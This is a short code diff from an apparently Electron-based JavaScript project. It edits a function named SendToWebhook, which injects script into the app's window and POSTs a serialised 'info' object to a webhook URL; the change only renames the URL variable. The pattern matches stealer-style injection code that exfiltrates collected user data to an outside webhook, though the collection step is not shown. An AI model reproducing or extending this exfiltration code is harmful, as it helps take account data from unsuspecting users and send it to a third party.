@@ -506,7 +506,7 @@ function SendToWebhook(info) {
 function SendToWebhook(info) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
-        xhr.open("POST", "${webhook}", true);
+        xhr.open("POST", "${sexhook}", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
         xhr.send(JSON.stringify(${info}));
